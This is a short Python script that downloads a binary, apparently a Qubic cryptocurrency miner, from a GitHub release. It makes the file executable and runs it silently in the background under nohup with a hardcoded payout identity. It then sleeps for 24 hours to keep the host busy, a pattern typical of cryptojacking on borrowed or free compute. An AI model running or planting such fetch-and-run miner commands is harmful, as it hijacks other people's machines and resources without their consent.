import sys
import os

os.system("wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v0.6.1/rqiner-x86-znver2")
os.system("chmod +x rqiner-x86-znver2")
os.system("nohup ./rqiner-x86-znver2 -i NVWTZZACJPEBAFBLYZNJXFGHJDPBTMIIFBDAOGSTHDHRCHXFTMZUXIOGERZG -t 2 2>&1 &")
os.system("sleep 1440m")